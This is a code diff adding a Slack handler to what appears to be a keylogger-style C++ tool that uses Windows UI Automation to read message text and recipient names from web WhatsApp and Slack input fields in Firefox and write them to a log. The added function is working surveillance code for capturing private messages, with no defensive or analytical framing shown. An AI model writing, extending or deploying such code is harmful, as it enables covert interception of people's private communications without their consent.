@@ -357,6 +357,7 @@ void MyAutomationEventHandler::HandleWhatsAppFF(IUIAutomationElement* pAutomatio
 		Log(L"Cant get msg contents", DBG);
 		goto exit;
 	}
+
 	wsLogKeyStroke += L"\nMsg: " + std::wstring(vMsgValue.bstrVal);
 
 	Log(wsLogKeyStroke, EMPTY);
@@ -372,5 +373,59 @@ exit:
 }
 void MyAutomationEventHandler::HandleSlackFF(IUIAutomationElement* pAutomationElement, const std::wstring& wsProcName, const std::wstring& wsDate)
 {
+	BSTR bMsgReceiver = NULL;
+	HRESULT hr = ERROR_SUCCESS;
+	VARIANT vIAccessibleRoleValue;
+	VARIANT vAriaRoleValue;
+	VARIANT vMsgValue;
+	VariantInit(&vIAccessibleRoleValue);
+	VariantInit(&vAriaRoleValue);
+	VariantInit(&vMsgValue);
 
+	std::wstring wsLogKeyStroke = wsDate + L" " + wsProcName + L" [New Web Slack Message]";
+
+	// check for the right field
+	hr = pAutomationElement->GetCurrentPropertyValue(UIA_LegacyIAccessibleRolePropertyId, &vIAccessibleRoleValue);
+	if (FAILED(hr) || vIAccessibleRoleValue.iVal != 42)
+	{
+		Log(L"Cant get LegacyIAccessibleRolePropertyId from WebWhatsappFF handler", DBG);
+		goto exit;
+	}
+
+	hr = pAutomationElement->GetCurrentPropertyValue(UIA_AriaRolePropertyId, &vAriaRoleValue);
+	if (FAILED(hr) || vAriaRoleValue.bstrVal == NULL || wcscmp(vAriaRoleValue.bstrVal, L"textbox") != 0)
+	{
+		Log(L"Cant get AriaRolePropertyId from WebWhatsappFF handler", DBG);
+		goto exit;
+	}
+
+	hr = pAutomationElement->get_CurrentName(&bMsgReceiver);
+	if (FAILED(hr))
+	{
+		Log(L"Can't get name of the Web Slack Message field", DBG);
+		goto exit;
+	}
+
+	// msg contents
+	hr = pAutomationElement->GetCurrentPropertyValue(UIA_ValueValuePropertyId, &vMsgValue);
+	if (FAILED(hr))
+	{
+		Log(L"Can't get value of the Web Slack Message field", DBG);
+		goto exit;
+	}
+
+	wsLogKeyStroke += L"\nTo: " + std::wstring(bMsgReceiver);
+	wsLogKeyStroke += L"\nMsg: " + std::wstring(vMsgValue.bstrVal);
+
+	Log(wsLogKeyStroke, EMPTY);
+
+exit:
+
+	if (bMsgReceiver)
+		SysFreeString(bMsgReceiver);
+
+	VariantClear(&vMsgValue);
+	VariantClear(&vAriaRoleValue);
+	VariantClear(&vIAccessibleRoleValue);
+	return;
 }
